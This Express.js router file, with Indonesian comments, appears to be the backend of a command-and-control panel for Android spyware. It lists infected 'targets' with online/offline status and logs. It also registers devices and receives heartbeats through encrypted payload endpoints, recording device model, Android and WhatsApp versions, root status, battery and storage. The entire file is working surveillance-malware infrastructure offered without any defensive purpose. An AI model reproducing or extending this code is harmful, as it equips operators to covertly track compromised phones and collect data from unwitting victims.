const express = require('express');
const router = express.Router();
const { getDb } = require('./db');
const { decryptPayload } = require('../crypto/aes');

// GET semua target
router.get('/', async (req, res) => {
    try {
        const db = getDb();
        const targets = await db.all(`
            SELECT *, (strftime('%s','now') - strftime('%s',last_seen)) as seconds_ago 
            FROM targets ORDER BY last_seen DESC
        `);
        targets.forEach(t => t.status = t.seconds_ago < 120 ? 'online' : 'offline');
        res.json(targets);
    } catch (e) {
        res.status(500).json({ error: 'Database error' });
    }
});

// GET satu target
router.get('/:uuid', async (req, res) => {
    try {
        const db = getDb();
        const target = await db.get('SELECT * FROM targets WHERE uuid = ?', [req.params.uuid]);
        if (!target) return res.status(404).json({ error: 'Not found' });
        const logs = await db.all('SELECT * FROM logs WHERE target_uuid = ? ORDER BY timestamp DESC LIMIT 50', [req.params.uuid]);
        target.logs = logs;
        res.json(target);
    } catch (e) {
        res.status(500).json({ error: 'Database error' });
    }
});

// REGISTER (dipanggil oleh payload via /api/register di server.js? Kita bisa pindahkan ke sini)
// Sebenarnya di server.js kita pakai endpoint /api/register sendiri, tapi kita bisa gabung.
// Untuk konsistensi, kita buat endpoint /register di sini.
router.post('/register', async (req, res) => {
    try {
        const payload = decryptPayload(req.body);
        const { uuid, device_info, whatsapp_version, is_rooted } = payload;
        const db = getDb();
        const existing = await db.get('SELECT * FROM targets WHERE uuid = ?', [uuid]);
        if (!existing) {
            await db.run(`
                INSERT INTO targets (uuid, device_name, android_version, model, manufacturer, whatsapp_version, is_rooted)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            `, [uuid, device_info.device_name || 'Unknown', device_info.android_version || 'Unknown',
                device_info.model || 'Unknown', device_info.manufacturer || 'Unknown',
                whatsapp_version || null, is_rooted || 0]);
        } else {
            await db.run(`
                UPDATE targets SET last_seen = CURRENT_TIMESTAMP, status = 'online',
                device_name = ?, android_version = ?, model = ?, manufacturer = ?,
                whatsapp_version = ?, is_rooted = ?
                WHERE uuid = ?
            `, [device_info.device_name || 'Unknown', device_info.android_version || 'Unknown',
                device_info.model || 'Unknown', device_info.manufacturer || 'Unknown',
                whatsapp_version || null, is_rooted || 0, uuid]);
        }
        res.json({ status: 'registered', uuid });
    } catch (e) {
        console.error('Register error:', e);
        res.status(500).json({ error: 'Registration failed' });
    }
});

// Update status (heartbeat) bisa juga di sini
router.post('/heartbeat', async (req, res) => {
    try {
        const payload = decryptPayload(req.body);
        const { uuid, battery, storage_used, storage_total } = payload;
        const db = getDb();
        await db.run(`
            UPDATE targets SET last_seen = CURRENT_TIMESTAMP, status = 'online',
            battery = ?, storage_used = ?, storage_total = ?
            WHERE uuid = ?
        `, [battery, storage_used, storage_total, uuid]);
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ error: 'Heartbeat failed' });
    }
});

module.exports = router;
